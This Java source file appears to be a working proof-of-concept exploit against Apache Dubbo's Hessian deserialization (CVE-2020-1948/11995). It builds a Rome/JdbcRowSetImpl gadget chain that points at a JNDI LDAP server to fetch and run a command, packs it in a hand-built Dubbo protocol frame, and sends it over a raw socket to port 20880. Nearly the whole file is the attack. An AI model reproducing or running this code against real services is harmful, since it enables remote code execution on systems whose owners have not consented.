package com.arliya.dubbo.main;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.dubbo.serialize.hessian.Hessian2ObjectOutput;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;


public class CVE2020194811995 {
    public static void main(String[] args) throws Exception{
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName("ldap://127.0.0.1:1389/Basic/Command/calc.exe");
        rs.setMatchColumn("foo");
        Utils.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);
        HashMap s = Utils.makeMap(root, "root");

        byte[] header = new byte[16];
        // 0xdabb Identifies dubbo protocol with value
        Bytes.short2bytes((short) 0xdabb, header);
        // 10000010  第一个 Request 1; Response 0  后5位 Identifies serialization type `fastjson is 6`
        header[2] = (byte) ((byte) 0x80 | 2);
        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        out.writeUTF("2.0.2");
        out.writeUTF("com.arliya.dubbo.api.Person");
        out.writeUTF("0.0.0");
//        out.writeUTF("sayHello");     // 2020-1948
        out.writeUTF("$invoke");      // 2020-11195
        out.writeUTF("Ljava/util/Map;");   // 这里指定henssian反序列化得类型。
        out.writeObject(s);
        out.writeObject(new HashMap());
        out.flushBuffer();
        if (out instanceof Cleanable) {
            ((Cleanable) out).cleanup();
        }

        // 请求数据的长度
        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        Socket socket = new Socket("127.0.0.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
}